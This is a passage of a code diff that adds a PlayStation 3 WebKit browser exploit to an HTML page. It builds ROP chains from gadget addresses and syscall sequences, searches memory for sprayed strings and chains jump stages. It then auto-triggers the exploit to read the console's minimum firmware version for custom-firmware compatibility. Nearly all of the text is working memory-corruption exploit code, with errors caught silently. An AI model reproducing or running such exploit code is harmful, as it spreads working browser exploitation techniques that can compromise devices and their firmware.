+                    WebKit_t_out = setTimeout(WebKit_initROP, 150, false);
+                } else {
+                    WebKit_total_loops = 0;
+                    WebKit_showResult(WebKit_fail_msg_frag);
+                    WebKit_t_out = 0;
+                }
+            }
+
+            function WebKit_initROP(init) {
+                if (!document.getElementById('WebKit_init')) {
+                    var btn = document.createElement('input');
+                    btn.id = 'WebKit_init';
+                    btn.type = 'button';
+                    btn.value = 'NOR';
+                    btn.style.display = 'none';
+                    document.body.appendChild(btn);
+                }
+                if (!document.getElementById('WebKit_nand')) {
+                    var nandBtn = document.createElement('input');
+                    nandBtn.id = 'WebKit_nand';
+                    nandBtn.type = 'button';
+                    nandBtn.value = 'NAND';
+                    nandBtn.style.display = 'none';
+                    document.body.appendChild(nandBtn);
+                }
+                if (!document.getElementById('WebKit_usbList')) {
+                    var usbSelect = document.createElement('select');
+                    usbSelect.id = 'WebKit_usbList';
+                    usbSelect.style.display = 'none';
+                    var opt = document.createElement('option');
+                    opt.value = '/dev_usb000/';
+                    opt.text = '/dev_usb000/';
+                    usbSelect.appendChild(opt);
+                    document.body.appendChild(usbSelect);
+                }
+
+                document.getElementById("WebKit_init").disabled = true;
+                document.getElementById("WebKit_nand").disabled = true;
+                try {
+                    if (init === true) { WebKit_frame_fails = 0; WebKit_search_base_off = 0; WebKit_search_size_ext = 0; }
+                    if (WebKit_t_out !== 0) { clearTimeout(WebKit_t_out); WebKit_t_out = 0; }
+                    WebKit_xtra_data_addr = 0;
+                    WebKit_stack_frame_addr = 0;
+                    WebKit_jump_2_addr = 0;
+                    WebKit_jump_1_addr = 0;
+                    WebKit_search_max_threshold = 70 * 0x100000;
+                    WebKit_search_base = 0x80100000;
+                    WebKit_search_size = 2 * WebKit_mbytes;
+                    WebKit_search_base_off = 0;
+                    WebKit_search_size_ext = 0;
+                    WebKit_total_loops++;
+
+                    WebKit_xtra_data = WebKit_base_file.WebKit_convert() +
+                        unescape("\u0000\u0000\u0000\u0000\u0000\u0000") +
+                        "rb".WebKit_convert() +
+                        unescape("\u0000\u4141\u4141\u4141\u4141") +
+                        WebKit_hexw2bin(WebKit_gadget3_addr) +
+                        WebKit_hexw2bin(WebKit_toc_addr) +
+                        unescape("\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141") +
+                        WebKit_hexw2bin(WebKit_gadget7_addr) +
+                        WebKit_hexw2bin(WebKit_toc_addr) +
+                        unescape("\u0000\u0000") +
+                        "/dev_flash/vsh/module/vsh.self".WebKit_convert() +
+                        unescape("\u0000\u0000") +
+                        WebKit_fulldumppath.WebKit_convert() +
+                        WebKit_fwrite_mode.WebKit_convert() +
+                        WebKit_hexw2bin(WebKit_gadget3_addr) +
+                        WebKit_hexw2bin(WebKit_toc_addr) +
+                        unescape("\u4141\u4141\u4141\u4141\uFD7E\u0000\u0000") +
+                        "a+b".WebKit_convert() +
+                        unescape("\u0000\u0000") +
+                        (WebKit_dump_path + WebKit_dump_file).WebKit_convert() +
+                        unescape("\u0000\u0000\u0000\u0000\u0000\u0000\uFD7E");
+
+                    while (WebKit_xtra_data_addr === 0) {
+                        if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
+                        WebKit_xtra_data = WebKit_xtra_data.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFD));
+                        WebKit_xtra_data_addr = WebKit_findJsVariableOffset("WebKit_xtra_data", WebKit_xtra_data, WebKit_search_base, WebKit_search_size, WebKit_search_base + WebKit_search_max_threshold);
+                        WebKit_search_max_threshold -= WebKit_search_size;
+                    }
+
+                    var vsh_addr = WebKit_xtra_data_addr + 0x5E;
+                    WebKit_stack_frame = WebKit_stack_frame_hookup() +
+                        WebKit_syscall(0x35F, 0x00006011, 0x1, 0x8B000000, 0, 0, 0, 0, 0) +
+                        WebKit_syscall(0x321, WebKit_xtra_data_addr, 0x0, 0x8e000000, 0, 0, 0, 0, 0) +
+                        WebKit_syscall_r3r5_p2p(0x322, 0x8e000000, 0x8a000000, 0x11000, 0x8e000008, 0, 0, 0, 0, 0, 0) +
+                        WebKit_syscall_r3_p2p(0x324, 0x8e000000, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
+                        WebKit_syscall(0x321, vsh_addr, 0x0, 0x8e001000, 0, 0, 0, 0, 0) +
+                        WebKit_syscall_r3r5_p2p(0x322, 0x8e001000, 0x8a500000, 0x11000, 0x8e001008, 0, 0, 0, 0, 0, 0) +
+                        WebKit_syscall_r3_p2p(0x324, 0x8e001000, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
+                        WebKit_stack_frame_exit();
+
+                    while (WebKit_stack_frame_addr === 0) {
+                        if (WebKit_search_max_threshold < WebKit_search_size + WebKit_search_size_ext) { WebKit_frame_fails++; if ((WebKit_frame_fails % 10) === 0) { WebKit_search_base_off += 0; WebKit_search_size_ext += 0; } WebKit_load_check(); return; }
+                        WebKit_stack_frame = WebKit_stack_frame.WebKit_replaceAt(0, WebKit_hexh2bin(0x2A2F));
+                        WebKit_stack_frame_addr = WebKit_findJsVariableOffset("WebKit_stack_frame", WebKit_stack_frame, WebKit_search_base + WebKit_search_base_off, WebKit_search_size + WebKit_search_size_ext, WebKit_search_base + WebKit_search_max_threshold);
+                        if (WebKit_stack_frame_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size + WebKit_search_size_ext) { WebKit_frame_fails++; WebKit_load_check(); return; }
+                        WebKit_search_max_threshold -= WebKit_search_size + WebKit_search_size_ext;
+                    }
+
+                    WebKit_jump_2 = unescape("\u0102\u7EFB") + WebKit_fill_by_16bytes(0x30, 0x8282) + WebKit_hexw2bin(WebKit_stack_frame_addr) + unescape("\uFB7E");
+                    while (WebKit_jump_2_addr === 0) {
+                        if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
+                        WebKit_jump_2 = WebKit_jump_2.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFB));
+                        WebKit_jump_2_addr = WebKit_findJsVariableOffset("WebKit_jump_2", WebKit_jump_2, WebKit_search_base, WebKit_search_size, WebKit_search_base + WebKit_search_max_threshold);
+                        if (WebKit_jump_2_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
+                        WebKit_search_max_threshold -= WebKit_search_size;
+                    }
+
+                    WebKit_jump_1 = unescape("\u4141\u7EFA") + WebKit_hexw2bin(WebKit_jump_2_addr) + unescape("\uFA7E");
+                    while (WebKit_jump_1_addr === 0) {
+                        if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
+                        WebKit_jump_1 = WebKit_jump_1.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFA));
+                        WebKit_jump_1_addr = WebKit_findJsVariableOffset("WebKit_jump_1", WebKit_jump_1, WebKit_search_base, WebKit_search_size, WebKit_search_base + WebKit_search_max_threshold);
+                        if (WebKit_jump_1_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
+                        WebKit_search_max_threshold -= WebKit_search_size;
+                    }
+
+                    var sf = WebKit_checkMemory(WebKit_stack_frame_addr - 0x4, 0x10000, WebKit_stack_frame.length);
+                    var x = WebKit_checkMemory(WebKit_xtra_data_addr - 0x4, 0x4000, WebKit_xtra_data.length);
+                    var j2 = WebKit_checkMemory(WebKit_jump_2_addr - 0x4, 0x2000, WebKit_jump_2.length);
+                    var j1 = WebKit_checkMemory(WebKit_jump_1_addr - 0x4, 0x2000, WebKit_jump_1.length);
+
+                    if ((j2 === WebKit_jump_2) && (j1 === WebKit_jump_1) && (x === WebKit_xtra_data) && (sf === WebKit_stack_frame)) {
+                        if (WebKit_t_out !== 0) { clearTimeout(WebKit_t_out); }
+                        WebKit_showResult("<h3><span style='color:green'>Offsets found! Auto-triggering exploit...</span></h3>");
+                        setTimeout(function() { WebKit_triggerX(); }, 500);
+                    } else {
+                        WebKit_load_check();
+                    }
+                } catch (e) {
+                    // silent
+                }
+            }
+
+            function WebKit_triggerX() {
+                document.getElementById("WebKit_init").disabled = true;
+                setTimeout(WebKit_trigger, 50, WebKit_jump_1_addr);
+                WebKit_showResult("<h3>Triggering exploit... Please wait.</h3>");
+                setTimeout(WebKit_minVer, 3000);
+                WebKit_t_out = 0;
+                WebKit_total_loops = 0;
+            }
+
+            var WebKit_stored_rawMem = null;
+
+            function WebKit_minVer() {
+    var rawMem = WebKit_checkMemOld(0x8B000000 - 0x8, 0x100, 0x100, 10);
+    if (!rawMem) {
+        WebKit_showResult("<h3><span style='color:orange;'>Error: Could not read memory. Make sure you are on OFW 4.80-4.82 or HFW 4.83-4.93 and have triggered the exploit.</span></h3>");
+        return;
+    }
+    WebKit_stored_rawMem = rawMem;
+    var minver = WebKit_s2hex(rawMem).toString().slice(3, 8).replace("00", ".");
+    var parsedVer = parseFloat(minver);
+
+    var compat = (parsedVer <= 3.56);
+    var statusIcon = compat ? '&#10004;' : '&#10008;';
+    var statusColor = compat ? 'green' : 'red';
+    var compatText = compat ? 'Yes' : 'No';
+
+    var resultHTML =
+        "<h3><span style='color:" + statusColor + ";'> Minimum Applicable Firmware Version: " + parsedVer.toFixed(2) +
+        " (Also Known As: Max Downgrade Version, Factory Firmware)" +
+        "</span></h3>" +
+        "<h3><span style='color:" + statusColor + ";'>CFW compatible: " + compatText + "</span></h3>";
+
+    WebKit_showResult(resultHTML);
+}
+
+            window.runWebKitExploit = function() {
+                WebKit_stored_rawMem = null;
+                WebKit_showResult("<h3>Starting exploit... Searching for offsets.</h3>");
+                setTimeout(function() { WebKit_initROP(true); }, 200);
+            };
+
+        })();
+    </script>
+
 </body>
 </html>
